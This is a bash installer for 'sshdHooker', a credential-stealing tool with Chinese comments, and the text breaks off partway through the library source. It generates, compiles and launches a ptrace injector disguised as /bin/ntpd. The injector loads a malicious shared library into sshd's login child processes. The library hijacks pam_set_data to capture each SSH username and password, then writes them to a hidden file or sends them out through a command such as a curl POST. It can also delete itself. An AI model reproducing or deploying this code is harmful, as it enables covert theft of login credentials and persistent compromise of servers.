#!/bin/bash
#
# sshdHooker 自动安装脚本 (x86_64)
#
# 流程: 在 /tmp 下生成注入器与恶意 so 的源码(按参数填充配置) ->
#       现场编译 -> 以 nohup 后台启动注入器注入 sshd
#
# 需 root 权限运行, 且需要关闭 SELinux
# ======================= 默认配置 =======================

inject_c="/tmp/.i.c"          # 注入器源码临时文件
shellcode_s="/tmp/.i.s"       # shellcode 汇编临时文件          # 注入器源码临时文件
got_c="/tmp/.g.c"             # 恶意 so 源码临时文件
evil_so_path="/tmp/.g.so"     # 恶意 so 编译输出路径
inject_bin="/bin/ntpd"        # 注入器伪装输出路径
payload="/tmp/.password.txt"  # 密码输出文件(或命令模板)
mode="0"                      # 0 = 文件模式, 1 = 命令模式
silent_mode="0"               # 0 = 关闭, 1 = 捕获后自删除
silent_user="anyone"          # 触发自删除的用户名, anyone = 任意用户
libc_string="libc-"           # /proc/pid/maps 中匹配 libc 的特征串

# ======================= sshd pid 定位与参数解析 =======================

# 精确模式: 取监听(listener)状态的 sshd 主进程;
# 失败则退化为取第一个 sshd 进程(pid 可能不准, 建议用 -s 手动指定)
sshd_pid=$(ps -ef | grep "sshd"|grep "listener" |grep -v grep | awk '{print $2}')
if [ ! $sshd_pid ]; then
    echo "By default, high-precision pid detection fails and low-precision mode is used. The sshd process id may be inaccurate and may need to be specified using s."
    sshd_pid=$(ps -ef | grep "sshd" -m 1| grep -v grep | awk '{print $2}')
fi

# -e so路径 -m 模式 -o 注入器路径 -p payload -d 静默销毁(用户名) -l libc 匹配串 -s 指定 sshd pid
while getopts ":e:m:o:p:d:l:s:" opt
do
    case $opt in
        e)
        evil_so_path=$OPTARG
        ;;
        m)
        mode=$OPTARG
        ;;
        o)
        inject_bin=$OPTARG
        ;;
        p)
        payload=$OPTARG
        ;;
        d)
        silent_mode="1"
        silent_user=$OPTARG
        ;;
        l)
        libc_string=$OPTARG
        ;;
        s)
        sshd_pid=$OPTARG
        ;;
    esac
done

cat>"${inject_c}"<<EOF
/*
 * sshdHooker 注入器 (x86_64)
 *
 * 整体流程:
 *   1. main: attach 到 sshd 主进程, 通过 PTRACE_SYSCALL 监控 clone(56) 调用,
 *      每次 sshd fork 出处理连接的子进程时, 创建一个 pthread 去跟踪它
 *   2. wait_for_libpam 线程: attach 到 sshd 子进程, 监听其系统调用,
 *      等它 open/openat "login.defs"(进入 PAM 认证阶段的特征)时执行注入
 *   3. inject_shellcode: 远程调用 mmap 在子进程内分配 RWX 内存,
 *      写入 so 路径与 shellcode, 跳转执行完成 dlopen 加载恶意 so
 *   4. manual_gc: 子进程退出后, 在 sshd 主进程内远程调用 waitpid
 *      回收僵尸子进程(修复 ptrace 接管后 sshd 自身无法回收子进程的问题)
 *
 * 编译: gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread
 * 用法: sudo ./inject <sshd_pid>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <dlfcn.h>
#include <link.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>

/* 恶意 so 落盘路径, 注入时写入目标进程供 shellcode dlopen */
char evil_so_path[] = "THISISEVILSOPATH";

/*
 * 在 /proc/pid/maps 中匹配 libc 的特征串.
 * 预留较大空间: 找不到 "libc-" 时会 strcpy 成 "libc.so" (原长度不够会越界).
 */
char libc_pattern[64] = "THISISLIBCSTRING";

/*
 * 待回收子进程的链式栈.
 * wait_for_libpam 线程在子进程退出后把节点压栈(prev 指向原栈顶),
 * main 循环检测到栈顶不是哨兵节点时, 执行 manual_gc 并弹栈.
 */
struct gc_stack {
    struct gc_stack *prev;
    pid_t target_pid;
} *gc_stack_top;

/* ======================= ptrace 基础封装 ======================= */

/* 在 ptrace_call 中会被提前调用, 先做前向声明 */
int ptrace_getregs(pid_t pid, struct user_regs_struct *regs);
int ptrace_setregs(pid_t pid, struct user_regs_struct *regs);
int ptrace_continue(pid_t pid);

/* 按 word 读取目标进程内存(当前未使用, 保留作调试工具) */
int ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
{
    int bytes_read = 0;
    int i = 0;
    long word = 0;
    unsigned long *ptr = (unsigned long *)data;

    while (bytes_read < len) {
        word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytes_read, NULL);
        if (word == -1) {
            fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
            return 1;
        }
        bytes_read += sizeof(long);
        if (bytes_read > len) {
            /* 末尾不足一个 word, 只拷贝有效字节 */
            memcpy(ptr + i, &word, sizeof(long) - (bytes_read - len));
            break;
        }
        ptr[i++] = word;
    }

    return 0;
}

/* 按 4 字节为单位将目标进程内存读入 buf */
int ptrace_readdata(pid_t pid, uint8_t *src, uint8_t *buf, size_t size)
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    /* 利用 union 以 long 对齐读取, 再按字节拷贝, 规避对齐问题 */
    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;

    laddr = buf;

    for (i = 0; i < j; i++) {
        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
        memcpy(laddr, d.chars, 4);
        src += 4;
        laddr += 4;
    }

    if (remain > 0) {
        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
        memcpy(laddr, d.chars, remain);
    }

    return 0;
}

/* 按 4 字节为单位把 data 写入目标进程内存, 末尾先读后写避免覆盖多余字节 */
int ptrace_writedata(pid_t pid, uint8_t *dest, uint8_t *data, size_t size)
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;

    laddr = data;

    for (i = 0; i < j; i++) {
        memcpy(d.chars, laddr, 4);
        ptrace(PTRACE_POKETEXT, pid, dest, d.val);

        dest += 4;
        laddr += 4;
    }

    if (remain > 0) {
        /* 不足 4 字节的部分: 先读出一个 word, 改写有效字节后写回 */
        d.val = ptrace(PTRACE_PEEKTEXT, pid, dest, 0);
        for (i = 0; i < remain; i++) {
            d.chars[i] = *laddr++;
        }

        ptrace(PTRACE_POKETEXT, pid, dest, d.val);
    }

    return 0;
}

/* 向目标进程写入一个字符串(含结尾 '\0') */
int ptrace_writestring(pid_t pid, uint8_t *dest, char *str)
{
    return ptrace_writedata(pid, dest, (uint8_t *)str, strlen(str) + 1);
}

/*
 * 在目标进程中远程调用 addr 处的函数.
 * params/num_params 为参数列表: 前 6 个走 rdi/rsi/rdx/rcx/r8/r9, 其余压栈.
 * is_trap:
 *   0 - 在栈顶写入 int 0x80 + int3, 被调函数返回后陷入 trap, 控制权交回 tracer
 *   1 - 在栈顶写入原 rip 作为返回地址, 执行完回到原位置
 */
int ptrace_call(pid_t pid, uint64_t addr, long *params, uint32_t num_params,
                struct user_regs_struct *regs, int is_trap)
{
    uint32_t i;

    long *regs_param[6] = {
        (long *)&(regs->rdi),
        (long *)&(regs->rsi),
        (long *)&(regs->rdx),
        (long *)&(regs->rcx),
        (long *)&(regs->r8),
        (long *)&(regs->r9)
    };

    /* 前 6 个参数放入寄存器 */
    for (i = 0; i < num_params && i < 6; i++) {
        memcpy(regs_param[i], &params[i], sizeof(long));
    }

    /* 超过 6 个的参数压栈 */
    if (i < num_params) {
        regs->rsp -= (num_params - i) * sizeof(long);
        ptrace_writedata(pid, (uint8_t *)regs->rsp, (uint8_t *)&params[i],
                         (num_params - i) * sizeof(long));
    }

    regs->rsp -= sizeof(long);
    if (is_trap == 0) {
        /* int 0x80 + int3: 被调函数 ret 到这里后触发 trap, 停回 tracer */
        uint8_t code[] = {0xcd, 0x80, 0xcc, 0};
        ptrace_writedata(pid, (uint8_t *)regs->rsp, code, 4);
    } else {
        /* 把原 rip 写到栈顶, 作为被调函数的返回地址 */
        ptrace_writedata(pid, (uint8_t *)regs->rsp, (uint8_t *)&regs->rip, sizeof(long));
    }

    regs->rip = addr;
    if (ptrace_setregs(pid, regs) == -1 || ptrace_continue(pid) == -1) {
        return -1;
    }

    /* 等待目标进程在 trap 处停下 */
    waitpid(pid, NULL, WUNTRACED);

    return 0;
}

int ptrace_getregs(pid_t pid, struct user_regs_struct *regs)
{
    if (ptrace(PTRACE_GETREGS, pid, NULL, regs) < 0) {
        printf("- [Getregs][%d] Can not get register values\n", pid);
        return -1;
    }

    return 0;
}

int ptrace_setregs(pid_t pid, struct user_regs_struct *regs)
{
    if (ptrace(PTRACE_SETREGS, pid, NULL, regs) < 0) {
        printf("- [Setregs][%d] Can not set register values\n", pid);
        return -1;
    }

    return 0;
}

int ptrace_continue(pid_t pid)
{
    if (ptrace(PTRACE_CONT, pid, NULL, 0) < 0) {
        perror("ptrace_cont");
        return -1;
    }

    return 0;
}

/* attach 并让目标进程停在系统调用入口, 随后可配合 PTRACE_SYSCALL 监听 */
int ptrace_attach(pid_t pid)
{
    if (ptrace(PTRACE_ATTACH, pid, NULL, 0) < 0) {
        perror("ptrace_attach");
        return -1;
    }

    waitpid(pid, NULL, WUNTRACED);

    if (ptrace(PTRACE_SYSCALL, pid, NULL, 0) < 0) {
        perror("ptrace_syscall");
        return -1;
    }

    waitpid(pid, NULL, WUNTRACED);

    return 0;
}

int ptrace_detach(pid_t pid)
{
    if (ptrace(PTRACE_DETACH, pid, NULL, 0) < 0) {
        perror("ptrace_detach");
        return -1;
    }

    return 0;
}

/* ======================= 目标进程模块信息 ======================= */

/* 解析 /proc/pid/maps, 取目标进程 libc 的完整路径 */
void get_libc_path(pid_t pid, char *path)
{
    FILE *fp;
    char filename[32];
    char line[1024];

    if (pid < 0) {
        /* pid < 0 表示读取自身进程 */
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    } else {
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    fp = fopen(filename, "r");
    if (fp != NULL) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, libc_pattern)) {
                /* 行末最后一个空格之后即是 so 的绝对路径 */
                char *m = strrchr(line, ' ');
                char *tmp = strchr(m, '\n');
                *tmp = '\0';
                m = m + 1;
                strcpy(path, m);
                break;
            }
        }
        fclose(fp);
    }

    return;
}

/* 解析 /proc/pid/maps, 取 module_name 在目标进程中的加载基址 */
void *get_module_base(pid_t pid, const char *module_name)
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[1024];

    if (pid < 0) {
        /* pid < 0 表示读取自身进程 */
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    } else {
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    fp = fopen(filename, "r");
    if (fp != NULL) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, module_name)) {
                /* 行首地址形如 "起始-结束", 取 '-' 前的起始地址 */
                pch = strtok(line, "-");
                addr = strtoul(pch, NULL, 16);

                if (addr == 0x8000) {
                    /* 0x8000 是静态 PIE 主程序在 maps 中的起始, 不是 so 基址 */
                    addr = 0;
                }

                break;
            }
        }
        fclose(fp);
    }

    return (void *)addr;
}

/*
 * 利用同一 so 在本进程与目标进程中的基址差, 把本进程内的地址
 * 换算成目标进程中的对应地址(同名 so 各进程内偏移一致).
 */
void *get_remote_addr(pid_t target_pid, const char *module_name, void *local_addr)
{
    void *local_base = get_module_base(-1, module_name);
    void *remote_base = get_module_base(target_pid, module_name);

    return (void *)((uint64_t)local_addr - (uint64_t)local_base + (uint64_t)remote_base);
}

/* ======================= 业务逻辑 ======================= */

/*
 * 在 sshd 主进程中远程循环调用 waitpid(-1, NULL, WNOHANG),
 * 回收因被注入/跟踪而遗留的僵尸子进程.
 */
void manual_gc(pid_t target_pid)
{
    struct user_regs_struct regs, original_regs;
    char libc_path[255];

    /*
     * 注意: 此处先用未初始化的 libc_path 去 dlopen, handle 通常为 NULL,
     * 而 dlsym(NULL, ...) 会转而搜索本进程的全局符号表, 因此仍能取到
     * 本进程 waitpid 的地址. 保持此调用顺序与原实现一致.
     */
    void *handle = dlopen(libc_path, RTLD_LAZY);
    get_libc_path(target_pid, libc_path);
    void *self_waitpid_addr = dlsym(handle, "waitpid");
    printf("+ [ManualGC][%d] Self waitpid address: %p\n", target_pid, self_waitpid_addr);
    void *waitpid_addr = get_remote_addr(target_pid, libc_pattern, self_waitpid_addr);
    printf("+ [ManualGC][%d] Remote waitpid address: %p\n", target_pid, waitpid_addr);

    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [ManualGC][%d] Getregs error, target: %d\n", target_pid, target_pid);
        return;
    }
    memcpy(&original_regs, &regs, sizeof(struct user_regs_struct));

    while (1) {
        long parameters[3];
        parameters[0] = -1; /* 任意子进程 */
        parameters[1] = 0;  /* 状态输出缓冲(wstatus 传 NULL) */
        parameters[2] = WNOHANG;
        if (ptrace_call(target_pid, (uint64_t)waitpid_addr, parameters, 3, &regs, 0) == -1) {
            printf("- [ManualGC][%d] Writedata error\n", target_pid);
            return;
        }
        ptrace_getregs(target_pid, &regs); /* rax 即 waitpid 返回值 */
        int retval = regs.rax;
        printf("+ [ManualGC][%d] waitpid = %ld\n", target_pid, (long)retval);
        if (retval == -1 || retval == 0 || retval == 4294967295) { /* 4294967295 == (unsigned)-1 */
            /* -1 出错 / 0 暂无已退出的子进程, 回收结束 */
            break;
        }
    }

    /* 恢复寄存器并让主进程继续运行 */
    ptrace_setregs(target_pid, &original_regs);
    ptrace_continue(target_pid);
}

/*
 * 向目标进程注入恶意 so:
 *   1. 远程调用 mmap 分配一块 RWX 匿名内存
 *   2. 写入 so 路径字符串与 shellcode
 *   3. 修改 rip 跳入 shellcode, 由其远程调用 dlopen 完成加载
 */
int inject_shellcode(pid_t target_pid)
{
    struct user_regs_struct regs, original_regs;
    void *malloc_addr, *dlopen_mode_addr, *mmap_addr;
    uint8_t *remote_code_ptr, *local_code_ptr;
    uint32_t code_length;
    char libc_path[255];
    FILE *fp;

    /* 恶意 so 不存在时删除自身(注入器)并退出, 避免残留 */
    fp = fopen(evil_so_path, "r");
    if (fp == NULL) {
        printf("! [Inject][%d] Cannot find so file, exit and remove\n", target_pid);
        char buf[1024];
        int count = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
        if (count < 0 || count >= 1024) {
            exit(0);
        }
        buf[count] = '\0';
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "rm %s", buf);
        system(cmd);
        exit(0);
    } else {
        fclose(fp);
    }

    if (ptrace_attach(target_pid) == -1) {
        printf("- [Inject][%d] inject attach failed\n", target_pid);
        return -1;
    }
    printf("+ [Inject][%d] Waiting for process...\n", target_pid);
    printf("+ [Inject][%d] Getting registers\n", target_pid);
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [Inject][%d] Getregs error\n", target_pid);
        return -1;
    }
    memcpy(&original_regs, &regs, sizeof(struct user_regs_struct));
    printf("+ [Inject][%d] Injecting shellcode at %p\n", target_pid, (void *)regs.rip);

    /* 优先按 "libc-" 匹配; 找不到再退化成 "libc.so"(musl 等环境) */
    void *libc_module_base = get_module_base(-1, libc_pattern);
    get_libc_path(target_pid, libc_path);
    if (libc_module_base == NULL) {
        printf("- [Inject][%d] Can't find libc-xxxx, try to find libc.so.x\n", target_pid);
        char tmp_libc[] = "libc.so";
        strcpy(libc_pattern, tmp_libc);
        libc_module_base = get_module_base(-1, libc_pattern);
        get_libc_path(target_pid, libc_path);
    }

    /* 在本进程解析 dlopen/malloc/mmap 的地址, 再换算成目标进程中的地址 */
    void *handle = dlopen(libc_path, RTLD_LAZY);
    void *self_dlopen_mode_addr = dlsym(handle, "dlopen");
    if (self_dlopen_mode_addr == NULL) {
        printf("- [Inject][%d] Can't find dlopen in libc, try to use __libc_dlopen_mode\n", target_pid);
        self_dlopen_mode_addr = dlsym(handle, "__libc_dlopen_mode");
    }
    void *self_malloc_addr = dlsym(handle, "malloc");
    void *self_mmap_addr = dlsym(handle, "mmap");
    malloc_addr = get_remote_addr(target_pid, libc_pattern, self_malloc_addr);
    mmap_addr = get_remote_addr(target_pid, libc_pattern, self_mmap_addr);
    dlopen_mode_addr = get_remote_addr(target_pid, libc_pattern, self_dlopen_mode_addr);

    printf("+ [Inject][%d] self libc module base: %p\n", target_pid, libc_module_base);
    printf("+ [Inject][%d] remote libc path: %s\n", target_pid, libc_path);
    printf("+ [Inject][%d] self dlopen base: %p\n", target_pid, self_dlopen_mode_addr);
    printf("+ [Inject][%d] remote malloc addr: %p\n", target_pid, malloc_addr);
    printf("+ [Inject][%d] remote mmap addr: %p local: %p\n", target_pid, mmap_addr, self_mmap_addr);
    printf("+ [Inject][%d] remote dlopen addr: %p\n", target_pid, dlopen_mode_addr);

    /* 远程调用 mmap(NULL, 0x4000, RWX, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0) */
    long parameters[10];
    parameters[0] = 0;                                   /* addr */
    parameters[1] = 0x4000;                              /* length */
    parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  /* prot */
    parameters[3] = MAP_ANONYMOUS | MAP_PRIVATE;         /* flags */
    parameters[4] = 0;                                   /* fd */
    parameters[5] = 0;                                   /* offset */

    if (ptrace_call(target_pid, (uint64_t)mmap_addr, parameters, 6, &regs, 0) == -1) {
        printf("- [Inject][%d] Writedata error\n", target_pid);
        return -1;
    }
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [Inject][%d] Getregs error\n", target_pid);
        return -1;
    }
    printf("+ [Inject][%d] mmap result: %p\n", target_pid, (void *)regs.rax);

    /* 先把 so 路径字符串写进 mmap 内存开头 */
    remote_code_ptr = (uint8_t *)regs.rax;
    ptrace_writedata(target_pid, remote_code_ptr, (uint8_t *)evil_so_path, strlen(evil_so_path) + 1);
    printf("+ [Inject][%d] Writing evil so path at: %p\n", target_pid, remote_code_ptr);

    /*
     * 把 so 路径地址与远程 dlopen 地址填入 shellcode 中的占位立即数:
     * mov rdi, imm64 / movabs rax, imm64 的操作码均为 2 字节,
     * 因此写入位置是 标签地址 +2, 长度 8 字节(见 shellcode.s).
     */
    extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s, _inject_start_s, _inject_end_s;
    memcpy((void *)((long)&_dlopen_mode_param1_s + 2), &remote_code_ptr, sizeof(long));
    memcpy((void *)((long)&_dlopen_mode_addr_s + 2), &dlopen_mode_addr, sizeof(long));

    /* shellcode 紧跟在 so 路径字符串之后写入 */
    remote_code_ptr += strlen(evil_so_path) + 1;
    local_code_ptr = (uint8_t *)&_inject_start_s;
    code_length = (uint32_t)((long)&_inject_end_s - (long)&_inject_start_s);
    ptrace_writedata(target_pid, remote_code_ptr, local_code_ptr, code_length);
    printf("+ [Inject][%d] Writing shellcode at: %p code length: %d\n", target_pid, remote_code_ptr, code_length);

    /* rip 指向 shellcode+6, 从 nop 滑道中进入正式指令 */
    regs.rip = (long)remote_code_ptr + 6;
    ptrace_setregs(target_pid, &regs);
    ptrace_continue(target_pid);
    waitpid(target_pid, NULL, WUNTRACED);

    /* 注入完成, 恢复原始寄存器并让子进程继续正常运行 */
    printf("+ [Inject][%d] EvilSo injected. Recovering the regs...\n", target_pid);
    ptrace_setregs(target_pid, &original_regs);

    ptrace_continue(target_pid);

    return 0;
}

/*
 * sshd 子进程跟踪线程入口:
 * attach 到 fork 出的 sshd 子进程, 监听其系统调用,
 * 等它 open/openat "login.defs"(PAM 认证阶段特征)时注入恶意 so.
 * 注入后继续等待子进程退出, 并将其压入 gc 栈等待 main 线程回收.
 */
int wait_for_libpam(pid_t target_pid)
{
    struct user_regs_struct regs;

    if (ptrace_attach(target_pid) == -1) {
        printf("- [WaitforLibPAM][%d] attach failed\n", target_pid);
        return -1;
    }
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [WaitforLibPAM][%d] Getregs error\n", target_pid);
        return -1;
    }

    /* login.defs 会在 PAM 认证阶段被读取, 作为注入时机信号 */
    char *path = malloc(255);
    char trigger_file[] = "login.defs";

    while (1) {
        ptrace(PTRACE_SYSCALL, target_pid, NULL, 0);
        waitpid(target_pid, NULL, WUNTRACED);

        /* ORIG_RAX 在系统调用进入/退出两种 stop 时都保存着调用号.
         * 入口 stop 时 rax 通常为 -ENOSYS(负数, 不触发), 出口 stop 时
         * rax 为返回值, 因此无需区分两种 stop. */
        long num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);

        if (num == 257) { /* openat, 路径参数在 rsi */
            ptrace_getregs(target_pid, &regs);
            ptrace_readdata(target_pid, (uint8_t *)regs.rsi, (uint8_t *)path, 255);
            if (strstr(path, trigger_file)) {
                printf("+ [WaitforLibPAM][%d] SubProcess: openat find path: %s\n", target_pid, path);
                ptrace_detach(target_pid);
                inject_shellcode(target_pid);
                break;
            }
        }
        if (num == 2) { /* open, 路径参数在 rdi */
            ptrace_getregs(target_pid, &regs);
            ptrace_readdata(target_pid, (uint8_t *)regs.rdi, (uint8_t *)path, 255);
            if (strstr(path, trigger_file)) {
                printf("+ [WaitforLibPAM][%d] SubProcess: open find path: %s\n", target_pid, path);
                ptrace_detach(target_pid);
                inject_shellcode(target_pid);
                break;
            }
        }
    }

    /* 子进程处理完连接退出后, 压栈等待 main 线程 manual_gc 回收 */
    printf("+ [WaitforLibPAM][%d] Wait child process ending\n", target_pid);
    waitpid(target_pid, NULL, 0);
    struct gc_stack node;
    node.prev = gc_stack_top;
    node.target_pid = target_pid;
    gc_stack_top = &node;

    printf("+ [WaitforLibPAM][%d] GC commit and child process end successful\n", target_pid);
    return 0;
}

/* pthread 线程包装: 参数以指针形式传入的是子进程 pid */
static void *watch_child_thread(void *arg)
{
    wait_for_libpam((pid_t)(long)arg);
    return NULL;
}

int main(int argc, char const *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <sshd_pid>\n", argv[0]);
        return -1;
    }

    pid_t target_pid = atoi(argv[1]);
    struct user_regs_struct regs;

    if (ptrace_attach(target_pid) == -1) {
        printf("- [Main][%d] Attach failed\n", target_pid);
        return -1;
    }
    printf("+ [Main][%d] Waiting for process...\n", target_pid);
    printf("+ [Main][%d] Getting registers\n", target_pid);
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [Main][%d] Getregs error\n", target_pid);
        return -1;
    }
    printf("+ [Main][%d] RAX is %p\n", target_pid, (void *)regs.rax);

    /* 初始化 gc 栈的哨兵栈底 */
    struct gc_stack bottom;
    bottom.prev = NULL;
    bottom.target_pid = 0;
    gc_stack_top = &bottom;

    printf("+ [Main][%d] Initialization stack successful\n", target_pid);

    while (1) {
        /* 栈顶不是哨兵节点说明有线程提交了待回收的子进程 */
        if (gc_stack_top->prev != NULL) {
            printf("+ [Main][%d] ManualGC start\n", target_pid);
            manual_gc(target_pid);
            gc_stack_top = gc_stack_top->prev;
            printf("+ [Main][%d] ManualGC end\n------------------------------------\n", target_pid);
        }

        ptrace(PTRACE_SYSCALL, target_pid, NULL, 0);
        waitpid(target_pid, NULL, WUNTRACED);

        long num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL); /* 当前系统调用号 */
        if (num == 56) { /* clone: sshd fork 出处理连接的子进程, rax 为子进程 pid */
            ptrace_getregs(target_pid, &regs);
            printf("+ [Main][%d] Process maybe = %ld\n", target_pid, (long)regs.rax);
            long child_pid = regs.rax;
            if (child_pid > 0) {
                /* 起线程去跟踪子进程, pid 通过指针参数传递 */
                pthread_t tid;
                pthread_create(&tid, NULL, watch_child_thread, (void *)child_pid);
            }
        }
    }

    return 0;
}
EOF

cat>"${shellcode_s}"<<EOF
# x86_64 注入用 shellcode
#
# 布局约束(与 sshdHooker.c 的注入逻辑强耦合):
#   - _inject_start_s 开头是 9 字节 nop 滑道, 注入后 rip 指向
#     shellcode+6, 从 nop 中间进入也能滑到正式指令
#   - _dlopen_mode_param1_s / _dlopen_mode_addr_s 两处 mov 的 64 位
#     立即数只是占位值, 注入器会定位到 标签+2(跳过 2 字节操作码)
#     把真实地址覆盖进去
#   - dlopen 返回后执行 int 0x80 + int3 触发 trap, 让注入器收回控制权
.intel_syntax noprefix
.global _dlopen_mode_addr_s
.global _dlopen_mode_param1_s
.global _inject_start_s
.global _inject_end_s
.global _printf_addr_s
.data
_inject_start_s:
        nop                     # 9 字节 nop 滑道
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        push   %rbp
        sub    %rsp, 0x8
        add    %rsp, 0x8
        mov    %rsi, 0x2        # rsi = RTLD_NOW(2), dlopen 的第二个参数
_dlopen_mode_param1_s:
        mov    %rdi,0x1122334455667788   # 占位: so 路径地址, 注入时覆盖为真实地址
_dlopen_mode_addr_s:
        movabs %rax,0x1122334455667788   # 占位: 远程 dlopen 地址, 注入时覆盖为真实地址
        call %rax              # dlopen(so_path, RTLD_NOW)
        int 0x80               # 触发 trap, 让 tracer 收回控制权
        int 0xcc
_inject_end_s:
.space 0x400, 0                # 预留空间, 避免注入写入/执行越界
.end
EOF

cat>"${got_c}"<<EOF
/*
 * inject_got.c - 注入到 sshd 进程的恶意 so
 *
 * 加载后通过 constructor(so_init) 自动完成 GOT 劫持:
 *   1. 定位 pam_unix.so 在当前进程中的加载基址
 *   2. 遍历其 ELF 动态段, 找到 pam_set_data 对应的重定位(GOT)表项
 *   3. 把表项改指向本文件的 my_pam_set_data, 完成函数劫持
 *
 * pam_unix 认证结束时会以 "unix_setcred_return" 为名调用 pam_set_data,
 * my_pam_set_data 据此捕获认证结果, 并从 pam_handle 中取出用户名与密码
 * 按配置外发(写文件或执行命令), 最后透传调用原函数, 不影响正常登录.
 *
 * 编译: gcc -shared inject_got.c -ldl -fPIC -o hello.so -std=c99
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <assert.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define MAX_BUF_SIZE 1024
#define MAX_PATH 255

/* ======================= 外发配置(install.sh 生成时会替换) ======================= */

int SEND_MODE = THISISMODE;  /* 0 = 写文件模式, 1 = 命令执行模式 */
char SEND_TARGET[MAX_PATH] = "THISISPAYLOAD"; /* SEND_MODE=0: 密码写入的文件路径; SEND_MODE=1: 命令模板, 两个 %s 分别对应用户名/密码 */
char EVIL_SO_PATH[] = "THISISEVILSOPATH"; /* 自身落盘路径, 静默销毁时用于 rm */
int SILENT_MODE = THISISSLIENTMODE;  /* 0 = 关闭, 1 = 捕获到密码后自删除退出 */
char SILENT_USER[] = "THISISSLIENTUSER"; /* SILENT_MODE=1 时: anyone 表示任意用户登录成功即销毁; 其他值则登录用户名命中时才销毁 */

/* 命令执行模式示例: */
// int SEND_MODE = 1;
// char SEND_TARGET[MAX_PATH] = "curl -X POST -d 'username=%s&password=%s' http://127.0.0.1";

/*
 * libpam 中 pam_handle 的内存布局(仅前缀部分).
 * 劫持函数里直接按偏移访问 user / authtok 字段,
 * 因此这里的字段顺序与类型必须与目标系统 libpam 保持一致.
 */
struct pam_handle {
    char *authtok;
    unsigned caller_is;
    struct pam_conv *pam_conversation;
    char *oldauthtok;
    char *prompt;                /* for use by pam_get_user() */
    char *service_name;
    char *user;
    char *rhost;
    char *ruser;
    char *tty;
    char *xdisplay;
    char *authtok_type;          /* PAM_AUTHTOK_TYPE */
    /*
    struct pam_data *data;
    struct pam_environ *env;
    struct _pam_fail_delay fail_delay;
    struct pam_xauth_data xauth;
    struct service handlers;
    struct _pam_former_state former;
    const char *mod_name;
    int mod_argc;
    char **mod_argv;
    int choice;

#ifdef HAVE_LIBAUDIT
    int audit_state;
#endif
    int authtok_verified;
    char *confdir;
    */
};

/* 解析 /proc/pid/maps, 取 module_name 在指定进程中的加载基址 */
void *get_module_base(pid_t pid, const char *module_name)
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[MAX_BUF_SIZE];

    /* 格式化字符串得到 "/proc/pid/maps" */
    if (pid < 0) {
        /* pid < 0 表示读取自身进程 */
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    } else {
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    /* 打开 /proc/pid/maps, 获取指定进程加载的内存模块信息 */
    fp = fopen(filename, "r");
    if (fp != NULL) {
        /* 逐行读取, 查找指定的 so 模块 */
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, module_name)) {
                /* 行首地址形如 "起始-结束", 取 '-' 前的起始地址 */
                pch = strtok(line, "-");
                addr = strtoul(pch, NULL, 16);
                break;
            }
        }
    }
    fclose(fp);
    return (void *)addr;
}

/* 重定位表相关信息, 从 DT_* 动态段条目中提取 */
struct rel_info {
    uint64_t rel_plt_addr; /* DT_JMPREL: .rela.plt 重定位表地址 */
    uint32_t rel_plt_size; /* DT_PLTRELSZ: 重定位表总大小 */
    uint64_t str_tab_addr; /* DT_STRTAB: 动态字符串表地址 */
    uint64_t sym_tab_addr; /* DT_SYMTAB: 动态符号表地址 */
    uint32_t rel_type;     /* DT_PLTREL: 重定位类型(DT_RELA=7 / DT_REL=17) */
};

/* PT_DYNAMIC 段的地址与大小 */
struct dynamic_segment {
    Elf64_Dyn *addr;
    uint32_t size;
};

static int get_dyn_section(void *base_addr, struct dynamic_segment *dyn);
static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info);
static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry);

/*
 * 在 base_addr 模块的重定位表中查找 func_name 对应的 GOT 表项,
 * 将其改为 target_entry; old_entry 非 NULL 时带回原函数地址.
 */
static int hook_entry(void *base_addr,
                      const char *func_name,
                      uint64_t *old_entry,
                      uint64_t target_entry)
{
    struct dynamic_segment dyn;
